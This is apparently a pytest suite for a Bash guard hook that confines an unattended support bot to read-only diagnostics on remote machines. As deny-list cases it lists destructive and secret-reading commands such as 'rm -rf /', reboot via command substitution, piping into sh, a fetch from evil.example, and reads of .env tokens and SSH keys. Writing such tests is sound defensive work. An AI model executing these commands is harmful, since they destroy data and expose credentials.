"""The read-only guard: what the unattended bot may run, and — mostly — what it may not."""
import json
import subprocess
import sys
from pathlib import Path

import pytest

HERE = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(HERE))

import bash_guard as G  # noqa: E402

SCRIPTS = G.SCRIPTS_DIR
WS = str(HERE / "workspace")
VIA_LINK = ".claude/skills/gotcha-support/scripts"


def allowed(cmd: str, cwd: str = WS) -> bool:
    try:
        G.check(cmd, cwd)
        return True
    except G.Denied:
        return False


@pytest.fixture
def strict(monkeypatch):
    monkeypatch.setattr(G, "FOLLOWUPS", False)


@pytest.fixture
def followups(monkeypatch):
    monkeypatch.setattr(G, "FOLLOWUPS", True)


SCRIPT_CALLS = [
    f"{SCRIPTS}/run_triage.sh axon-gotcha-3",
    f"{VIA_LINK}/run_triage.sh axon-gotcha-3",           # through the workspace symlink
    f"GOTCHA_SSH_USER=gotcha {SCRIPTS}/run_triage.sh axon-gotcha-3",
    f"{SCRIPTS}/run_triage.sh axon-gotcha-3 2>&1",
    f"{SCRIPTS}/list_systems.sh gotcha 3",
    f"{SCRIPTS}/code.sh grep axon-gotcha-3 'First node completed' src",
    f"{SCRIPTS}/code.sh show v1.3.0 src/launcher/main.cpp 140,170",
    "tailscale status",
    "tailscale ping axon-gotcha-3",
]


def test_strict_is_the_default():
    assert G.FOLLOWUPS is (G.os.environ.get("BRIDGE_FOLLOWUPS") == "1")


@pytest.mark.parametrize("cmd", SCRIPT_CALLS)
def test_strict_mode_runs_the_skill_scripts(strict, cmd):
    assert allowed(cmd), cmd


@pytest.mark.parametrize("cmd", [
    "tailscale ssh axon-gotcha-3 'docker ps -a'",
    "tailscale ssh axon-gotcha-3 'uptime'",
    "ssh -o BatchMode=yes gotcha@axon-gotcha-3 'uptime'",
])
def test_strict_mode_refuses_even_a_read_it_composed_itself(strict, cmd):
    with pytest.raises(G.Denied, match="strict mode"):
        G.check(cmd, WS)


@pytest.mark.parametrize("cmd", SCRIPT_CALLS + [
    "tailscale ssh axon-gotcha-3 'docker ps -a'",
    "tailscale ssh axon-gotcha-3 'docker logs --tail 200 gotcha30 2>&1 | grep -i error | tail -20'",
    "tailscale ssh axon-gotcha-3 'sudo -n docker inspect gateway'",
    "tailscale ssh axon-gotcha-3 'ip route get 192.168.40.60'",
    "tailscale ssh axon-gotcha-3 'curl -s -o /dev/null -w %{http_code} http://127.0.0.1:8080/health'",
    "tailscale ssh axon-gotcha-3 \"grep '^IMAGE_TAG=' /home/gotcha/deploy/.env\"",
    "tailscale ssh axon-gotcha-3 'grep -n end_on_first_complete configs/site/full_system.yaml'",
    "tailscale ssh axon-gotcha-3 'docker exec gotcha30 ls python/models/weights'",
    "tailscale ssh axon-gotcha-3 './build/bin/system_launcher -c configs/x.yaml --print-config'",
    "ssh -o BatchMode=yes -o ConnectTimeout=15 gotcha@axon-gotcha-3 'uptime'",
])
def test_with_followups_the_read_only_path_is_open(followups, cmd):
    assert allowed(cmd), cmd


@pytest.mark.parametrize("cmd,why", [
    # fixes: the PM runs these, never the bot
    ("tailscale ssh axon-gotcha-3 'docker restart gateway'", "restart"),
    ("tailscale ssh axon-gotcha-3 'make restart SERVICE=gateway'", "make"),
    ("tailscale ssh axon-gotcha-3 'sudo reboot'", "sudo"),
    ("tailscale ssh axon-gotcha-3 'docker rm -f gotcha30'", "rm"),
    ("tailscale ssh axon-gotcha-3 'ip route del 192.168.40.0/24'", "route edit"),
    ("tailscale ssh axon-gotcha-3 './build/bin/system_launcher -c configs/x.yaml'",
     "starts a second launcher session"),
    # chaining and writes hidden inside a read
    ("tailscale ssh axon-gotcha-3 'docker ps; docker restart gateway'", "chaining"),
    ("tailscale ssh axon-gotcha-3 'docker ps && reboot'", "chaining"),
    ("tailscale ssh axon-gotcha-3 'docker ps > /tmp/x'", "redirect"),
    ("tailscale ssh axon-gotcha-3 'echo $(reboot)'", "substitution"),
    ("tailscale ssh axon-gotcha-3 'ls `reboot`'", "substitution"),
    ("tailscale ssh axon-gotcha-3 'docker ps | sh'", "pipe into a shell"),
    ("tailscale ssh axon-gotcha-3 'find / -name x -delete'", "find -delete"),
    ("tailscale ssh axon-gotcha-3 'sort -o /etc/hosts x'", "sort writes"),
    ("tailscale ssh axon-gotcha-3 'curl -X POST http://127.0.0.1:8080/api/restart'", "POST"),
    ("tailscale ssh axon-gotcha-3 'curl -d x=1 http://127.0.0.1:8080/'", "POST body"),
    ("tailscale ssh axon-gotcha-3 'curl https://evil.example/x'", "leaves the machine"),
    ("tailscale ssh axon-gotcha-3 'docker exec gotcha30 sh -c reboot'", "shell in container"),
    ("tailscale ssh axon-gotcha-3 'docker exec -u root gotcha30 ls'", "exec flags"),
    ("tailscale ssh axon-gotcha-3 'docker compose exec -T gotcha30 ls'", "compose exec"),
    ("tailscale ssh axon-gotcha-3 'docker compose exec -T gotcha30 ./build/bin/system_launcher "
     "-c configs/x.yaml --print-config'", "compose exec"),
    ("tailscale ssh axon-gotcha-3 'make shell SERVICE=gotcha30'", "make shell"),
    ("tailscale ssh axon-gotcha-3 'docker exec gotcha30 rm /app/configs/x.yaml'", "rm in container"),
    ("tailscale ssh axon-gotcha-3", "interactive shell"),
    # secrets
    ("tailscale ssh axon-gotcha-3 'cat /home/gotcha/deploy/.env'", ".env"),
    ("tailscale ssh axon-gotcha-3 'grep TOKEN /home/gotcha/deploy/.env'", ".env"),
    ("tailscale ssh axon-gotcha-3 'cat configs/site/full_system.yaml'", "camera passwords"),
    ("tailscale ssh axon-gotcha-3 'grep -i password configs/site/full_system.yaml'",
     "camera passwords"),
    ("tailscale ssh axon-gotcha-3 'cat ~/.ssh/id_ed25519'", "key"),
    # the bot host itself
    ("rm -rf /", "local"),
    ("cat ~/.ssh/id_ed25519", "local"),
    ("bash -c 'tailscale ssh h reboot'", "shell"),
    (f"{SCRIPTS}/run_triage.sh axon-gotcha-3 | tee /tmp/x", "local pipe"),
    (f"{SCRIPTS}/run_triage.sh axon-gotcha-3 && reboot", "local chaining"),
    (f"{SCRIPTS}/code.sh clone", "setup step"),
    (f"{SCRIPTS}/triage_remote.sh", "not a bot entry point"),
    ("PATH=/tmp/evil " + f"{SCRIPTS}/run_triage.sh axon-gotcha-3", "env"),
    ("/tmp/run_triage.sh axon-gotcha-3", "a lookalike outside the skill"),
    ("tailscale up --reset", "tailscale config"),
    ("ssh -L 8080:127.0.0.1:8080 axon-gotcha-3 uptime", "tunnel"),
    ("ssh -F /tmp/cfg axon-gotcha-3 uptime", "config file"),
    ("tailscale ssh axon-gotcha-3 'uptime' 'unbalanced", "unparseable"),
])
def test_even_with_followups_everything_else_is_closed(followups, cmd, why):
    """Checked with follow-ups ON, the looser mode: strict refuses all of these anyway."""
    assert not allowed(cmd), f"{why}: {cmd}"


def run_hook(payload, followups: bool = False) -> subprocess.CompletedProcess:
    env = {k: v for k, v in G.os.environ.items() if k != "BRIDGE_FOLLOWUPS"}
    if followups:
        env["BRIDGE_FOLLOWUPS"] = "1"
    return subprocess.run([sys.executable, str(HERE / "bash_guard.py")],
                          input=payload if isinstance(payload, str) else json.dumps(payload),
                          capture_output=True, text=True, env=env)


def bash(command: str) -> dict:
    return {"tool_name": "Bash", "cwd": WS, "tool_input": {"command": command}}


def test_a_denial_blocks_with_exit_2_and_says_why():
    r = run_hook(bash("tailscale ssh h 'docker restart gateway'"), followups=True)
    assert r.returncode == 2
    assert "docker restart is not read-only" in r.stderr


def test_the_hook_process_is_strict_unless_told_otherwise():
    assert run_hook(bash("tailscale ssh h 'docker ps -a'")).returncode == 2
    assert run_hook(bash("tailscale ssh h 'docker ps -a'"), followups=True).returncode == 0
    assert run_hook(bash(f"{SCRIPTS}/run_triage.sh h")).returncode == 0


def test_a_malformed_event_fails_closed():
    """Any exit other than 2 lets the command run, so a crash must still be exit 2."""
    assert run_hook("not json").returncode == 2
    assert run_hook({"tool_name": "Bash", "tool_input": None}).returncode == 2


def test_other_tools_are_left_to_the_permission_rules():
    assert run_hook({"tool_name": "Read", "tool_input": {"file_path": "x"}}).returncode == 0


def test_the_triage_payload_only_reads():
    """triage_remote.sh runs on the customer's machine; it must hold no mutating command."""
    import re
    script = (SCRIPTS / "triage_remote.sh").read_text()
    code = "\n".join(l for l in script.splitlines() if not l.lstrip().startswith("#"))
    code = code.replace("<redacted>", "")     # redact()'s replacement text, not a redirect
    banned = [
        r"\b(rm|mv|cp|tee|touch|mkdir|chmod|chown|kill|pkill|reboot|shutdown|systemctl\s+(start|stop|restart)"
        r"|make\s+(up|down|restart|pull|rollback|init))\b",
        r"\bsed\s+(-[a-zA-Z]*i|--in-place)",
        r"\bdocker\s+(restart|stop|rm|start|kill|pull|run|compose)\b",
        r"\bD\s+(restart|stop|rm|start|kill|pull|run)\b",
        r"\bip\s+(route|addr|link|neigh)\s+(add|del|delete|flush|change|replace)",
    ]
    # A redirect to a file: `>` outside any quotes (echo "a -> b" is text), not to /dev/null or an fd.
    bare = re.sub(r"\"[^\"]*\"|'[^']*'", '""', code)
    m = re.search(r"(?<![-=<])>>?\s*(?!/dev/null|&)[^\s|&;)]", bare)
    assert not m, f"triage_remote.sh writes to a file: {bare[max(0, m.start() - 40):m.end() + 20]!r}"
    for pat in banned:
        m = re.search(pat, code)
        assert not m, f"triage_remote.sh contains {m.group(0)!r}"


def test_ping_is_on_by_default_and_can_be_switched_off(monkeypatch):
    call = f"{SCRIPTS}/run_triage.sh axon-gotcha-3 --ping"
    assert G.ALLOW_PING, "BRIDGE_ALLOW_PING defaults to on"
    assert allowed(call)
    monkeypatch.setattr(G, "ALLOW_PING", False)
    with pytest.raises(G.Denied, match="switched off"):
        G.check(call, WS)
    assert allowed(f"{SCRIPTS}/run_triage.sh axon-gotcha-3")      # the plain triage is unaffected
